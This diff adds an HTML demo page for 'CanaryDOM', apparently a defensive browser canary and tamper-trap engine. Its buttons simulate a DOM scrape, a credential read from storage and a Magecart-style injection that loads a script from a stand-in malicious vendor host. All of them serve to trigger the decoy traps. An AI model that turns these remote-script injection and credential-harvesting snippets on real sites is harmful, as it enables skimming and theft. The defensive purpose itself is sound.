@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CanaryDOM: Client-Side Deception & Threat Detection Engine</title>
+  <style>
+    :root {
+      --bg: #0d1117;
+      --card-bg: #161b22;
+      --border: #30363d;
+      --accent: #58a6ff;
+      --red: #f85149;
+      --orange: #d29922;
+      --text: #c9d1d9;
+      --code-bg: #0b0e14;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+      padding: 2rem;
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+    h1, h2, h3 { color: #f0f6fc; }
+    .badge {
+      display: inline-block;
+      padding: 0.2rem 0.6rem;
+      background: #21262d;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      font-size: 0.8rem;
+      color: var(--accent);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.25rem;
+    }
+    button {
+      width: 100%;
+      background-color: #238636;
+      color: white;
+      border: none;
+      padding: 0.6rem 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 600;
+      margin-top: 0.75rem;
+      transition: background 0.2s;
+    }
+    button:hover { background-color: #2ea043; }
+    button.critical { background-color: #b62324; }
+    button.critical:hover { background-color: #d1242f; }
+    #console {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1rem;
+      height: 260px;
+      overflow-y: auto;
+      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+      font-size: 0.85rem;
+    }
+    .log-entry { margin-bottom: 0.5rem; border-bottom: 1px solid #1c2128; padding-bottom: 0.25rem; }
+    .sev-HIGH { color: var(--orange); }
+    .sev-CRITICAL { color: var(--red); font-weight: bold; }
+    .sev-MEDIUM { color: var(--accent); }
+  </style>
+</head>
+<body>
+
+  <header>
+    <span class="badge">AppSec / Browser Deception Engineering</span>
+    <h1>CanaryDOM Engine</h1>
+    <p>Real-time client-side canary injection, tamper traps, and DOM-XSS exfiltration defense.</p>
+  </header>
+
+  <h2>Simulate Threat Vectors</h2>
+  <div class="grid">
+    <!-- Vector 1 -->
+    <div class="card">
+      <h3>1. DOM Scraper / Malicious Extension</h3>
+      <p>Simulates an extension iterating over all input elements looking for API tokens and passwords.</p>
+      <button onclick="simulateExtensionScrape()">Run Extension Scrape</button>
+    </div>
+
+    <!-- Vector 2 -->
+    <div class="card">
+      <h3>2. DOM-XSS Global Access</h3>
+      <p>Simulates injected malicious JavaScript accessing decoy global admin contexts.</p>
+      <button onclick="simulateXSSGlobalAccess()">Access Honey Global</button>
+    </div>
+
+    <!-- Vector 3 -->
+    <div class="card">
+      <h3>3. Credential Exfiltration (Storage)</h3>
+      <p>Simulates a script reading sensitive credentials out of Web Storage.</p>
+      <button onclick="simulateStorageHarvest()">Harvest LocalStorage</button>
+    </div>
+
+    <!-- Vector 4 -->
+    <div class="card">
+      <h3>4. Magecart Supply-Chain Injection</h3>
+      <p>Simulates a compromised third-party vendor dynamically injecting a remote payload script.</p>
+      <button class="critical" onclick="simulateMagecartInjection()">Inject Dynamic Script</button>
+    </div>
+  </div>
+
+  <h2>Security Event Telemetry Stream</h2>
+  <div id="console"></div>
+
+  <!-- Load CanaryDOM Engine -->
+  <script src="src/canary-dom.js"></script>
+  <script>
+    // Initialize CanaryDOM with local mock endpoint
+    CanaryDOM.init({
+      telemetryEndpoint: '/mock-telemetry-sink',
+      appId: 'portfolio-demo'
+    });
+
+    // Mirror telemetry events into the UI log
+    window.addEventListener('canary:alert', (e) => {
+      const consoleBox = document.getElementById('console');
+      const entry = document.createElement('div');
+      entry.className = `log-entry sev-${e.detail.severity}`;
+      entry.innerHTML = `[${e.detail.timestamp.split('T')[1].replace('Z','')}] <strong>[${e.detail.severity}]</strong> ${e.detail.eventType} &rarr; ${JSON.stringify(e.detail.details)}`;
+      consoleBox.insertBefore(entry, consoleBox.firstChild);
+    });
+
+    // Simulation Triggers
+    function simulateExtensionScrape() {
+      const inputs = document.querySelectorAll('input');
+      inputs.forEach(i => {
+        const _dump = i.value; // Triggers getter trap
+      });
+    }
+
+    function simulateXSSGlobalAccess() {
+      if (window.__API_CONFIG__) {
+        const stolenSecret = window.__API_CONFIG__.secret; // Triggers Proxy 'get' trap
+      }
+    }
+
+    function simulateStorageHarvest() {
+      localStorage.getItem('oauth_client_secret_canary'); // Triggers Storage getter trap
+    }
+
+    function simulateMagecartInjection() {
+      const rogueScript = document.createElement('script');
+      rogueScript.src = 'https://cdn.malicious-vendor-tracker.io/payload.js';
+      document.body.appendChild(rogueScript); // Triggers MutationObserver
+    }
+  </script>
+</body>
+</html>
